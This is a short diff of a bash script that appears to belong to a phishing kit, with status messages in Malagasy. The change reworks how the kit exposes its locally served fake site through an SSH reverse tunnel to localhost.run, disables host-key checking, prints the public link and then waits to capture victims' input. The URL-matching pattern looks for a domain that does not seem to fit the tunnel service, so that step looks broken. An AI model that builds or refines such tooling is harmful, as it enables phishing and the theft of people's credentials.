@@ -269,21 +269,22 @@ capture_data() {
         sleep 0.75
     done
 }
+
 start_ssh_tunnel() {
     cusport
-    echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Manomboka ny tunnel SSH (Localhost.run)..."
+    echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Manomboka ny tunnel (Localhost.run)..."
     setup_site
-    # Lancement du tunnel SSH en arrière-plan et récupération du lien
-    ssh -R 80:127.0.0.1:$PORT localhost.run > .server/ssh.log 2>&1 &
-    sleep 5
     
-    # Extraction propre de l'URL générée
+    # Lancement du tunnel SSH en arrière-plan avec nokey
+    ssh -o StrictHostKeyChecking=no -R 80:127.0.0.1:$PORT nokey@localhost.run > .server/ssh.log 2>&1 &
+    sleep 6
+    
     clear; banner_small
     echo -e "${RED}[${WHITE}-${RED}]${GREEN} Rohy azo (URL) :"
     grep -o "https://[-0-9a-z]*\.loca.lt" .server/ssh.log
+    echo -e "\n${RED}[${WHITE}-${RED}]${YELLOW} Miandry ny fidiran'ny mpampiasa..."
     capture_data
 }
-
 start_ngrok() {
     cusport
     echo -e "${RED}[${WHITE}-${RED}]${GREEN} Alefa i Ngrok (${CYAN}http://$HOST:$PORT${GREEN})..."
